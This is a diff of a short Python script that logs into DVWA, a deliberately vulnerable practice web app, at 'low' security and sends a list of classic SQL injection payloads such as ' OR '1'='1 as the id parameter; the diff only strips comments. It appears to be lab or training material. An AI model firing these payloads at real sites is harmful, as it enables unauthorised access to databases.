@@ -10,11 +10,6 @@ def main():
     session = requests.Session()
     session.cookies.set("security", "low")
     session = login_session(session)
- #    cookie = {
- #        "PHPSESSID": "YOUR_SESSION_ID",
- #        "security": "low",
- #    }  # Replace with your DVWA session cookie
-    # Common SQL injection payloads
     payloads = [
         "' OR '1'='1",
         "' OR '1'='1' -- ",
@@ -23,7 +18,6 @@ def main():
         "1' OR '1'='1",
     ]
 
-    # Loop through payloads and send requests
     for payload in payloads:
         params = {"id": payload, "Submit": "Submit"}
         response = requests.get(url, params=params, cookies=session.cookies.get_dict())
